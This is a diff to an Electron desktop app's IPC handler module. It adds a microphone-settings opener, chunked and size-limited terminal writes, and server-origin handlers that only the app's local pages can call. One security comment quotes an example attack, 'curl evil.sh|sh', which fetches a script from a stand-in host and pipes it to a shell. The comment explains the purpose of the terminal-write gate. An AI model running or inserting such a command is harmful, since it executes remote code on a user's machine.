@@ -9,6 +9,8 @@ import {
 } from '@sim/browser-protocol'
 import {
   type DesktopNotificationPayload,
+  type DesktopServerChangeResult,
+  type DesktopServerConfiguration,
   type DesktopUpdateState,
   type DesktopWindowState,
   type DesktopZoomPercent,
@@ -17,14 +19,17 @@ import {
   isDesktopZoomPercent,
   isPendingDesktopScopeId,
 } from '@sim/desktop-bridge'
+import { createLogger } from '@sim/logger'
 import {
   isTerminalOperation,
   isTerminalToolName,
   type TerminalToolArgs,
 } from '@sim/terminal-protocol'
+import { getErrorMessage } from '@sim/utils/errors'
 import { isRecordLike } from '@sim/utils/object'
+import { PASTE_LIMITS, utf8ByteLength } from '@sim/utils/paste'
 import type { BrowserWindow, IpcMainEvent, IpcMainInvokeEvent, WebContents } from 'electron'
-import { clipboard, ipcMain } from 'electron'
+import { clipboard, ipcMain, shell } from 'electron'
 import {
   type BrowserToolQueueBoundary,
   cancelActiveTool,
@@ -82,8 +87,51 @@ import type { ScopedEventRouter } from '@/main/scoped-event-router'
 import type { TerminalRegistry } from '@/main/terminal/registry'
 import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'
 
+const logger = createLogger('DesktopIpc')
+
 /** Workspace/chat ids are opaque tokens; anything else never reaches a URL. */
 const ID_PATTERN = /^[A-Za-z0-9_-]{1,128}$/
+const TERMINAL_WRITE_CHUNK_CHARACTERS = 64 * 1024
+
+function writeTerminalText(
+  terminal: TerminalRegistry,
+  scope: string,
+  terminalId: string,
+  text: string
+): void {
+  let start = 0
+  while (start < text.length) {
+    let end = Math.min(start + TERMINAL_WRITE_CHUNK_CHARACTERS, text.length)
+    const finalCode = text.charCodeAt(end - 1)
+    if (end < text.length && finalCode >= 0xd800 && finalCode <= 0xdbff) end -= 1
+    terminal.write(scope, terminalId, text.slice(start, end))
+    start = end
+  }
+}
+
+const MICROPHONE_SETTINGS_URLS: Partial<Record<NodeJS.Platform, string>> = {
+  darwin: 'x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone',
+  win32: 'ms-settings:privacy-microphone',
+}
+
+/** Opens the native microphone privacy pane without accepting a renderer-provided URL. */
+export async function openMicrophoneSettings(
+  platform: NodeJS.Platform = process.platform
+): Promise<boolean> {
+  const settingsUrl = MICROPHONE_SETTINGS_URLS[platform]
+  if (!settingsUrl) return false
+
+  try {
+    await shell.openExternal(settingsUrl)
+    return true
+  } catch (error) {
+    logger.warn('Could not open microphone privacy settings', {
+      error: getErrorMessage(error),
+      platform,
+    })
+    return false
+  }
+}
 
 /**
  * Desktop state is partitioned by the existing chat id. A new-chat view uses
@@ -300,6 +348,11 @@ export interface IpcDeps {
     getState: () => DesktopUpdateState
     check: () => void
     install: () => void
+  }
+  server: {
+    open: () => void
+    getConfiguration: () => DesktopServerConfiguration
+    setOrigin: (origin: string) => Promise<DesktopServerChangeResult>
   }
 }
 
@@ -619,6 +672,12 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       denied: false,
       handler: (url) =>
         typeof url === 'string' ? openExternalSafe(url, deps.allowHttpLocalhost()) : false,
+    },
+    'desktop:open-microphone-settings': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      denied: false,
+      handler: () => openMicrophoneSettings(),
     },
     // OAuth connect handoff: the whole flow runs in the system browser (state
     // is cookie-bound to the initiating user agent), returning via loopback.
@@ -1505,7 +1564,10 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         if (!scope || typeof terminalId !== 'string') return false
         const text = clipboard.readText()
         if (!text) return false
-        deps.terminal.write(scope, terminalId, text)
+        if (utf8ByteLength(text, PASTE_LIMITS.TERMINAL_BYTES) > PASTE_LIMITS.TERMINAL_BYTES) {
+          return 'too-large'
+        }
+        writeTerminalText(deps.terminal, scope, terminalId, text)
         return true
       },
     },
@@ -1694,7 +1756,8 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       handler: (sender, terminalId, data, rawScope) => {
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
         if (!scope || typeof terminalId !== 'string' || typeof data !== 'string') return
-        deps.terminal.write(scope, terminalId, data)
+        if (utf8ByteLength(data, PASTE_LIMITS.TERMINAL_BYTES) > PASTE_LIMITS.TERMINAL_BYTES) return
+        writeTerminalText(deps.terminal, scope, terminalId, data)
       },
       // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
       // Panel focus is deliberately not used — `terminal:focused` is a
@@ -1736,6 +1799,31 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'local-page',
       passSender: true,
       handler: (sender) => deps.retryLoad(sender as WebContents),
+    },
+    // The `server:` family is local-page only, and deliberately so: the one
+    // surface that repoints the shell at another deployment must keep working
+    // when the current one is unreachable (the offline page is where a
+    // self-hoster with a typo'd origin actually lands), and must never be
+    // drivable by a page the current server serves.
+    'server:open': {
+      kind: 'send',
+      gate: 'local-page',
+      handler: () => deps.server.open(),
+    },
+    'server:get-configuration': {
+      kind: 'invoke',
+      gate: 'local-page',
+      denied: null,
+      handler: () => deps.server.getConfiguration(),
+    },
+    'server:set-origin': {
+      kind: 'invoke',
+      gate: 'local-page',
+      denied: { ok: false, error: 'The server can only be changed from the Sim app itself.' },
+      handler: (origin) =>
+        typeof origin === 'string'
+          ? deps.server.setOrigin(origin)
+          : { ok: false, error: 'Server URL is required' },
     },
   }
 
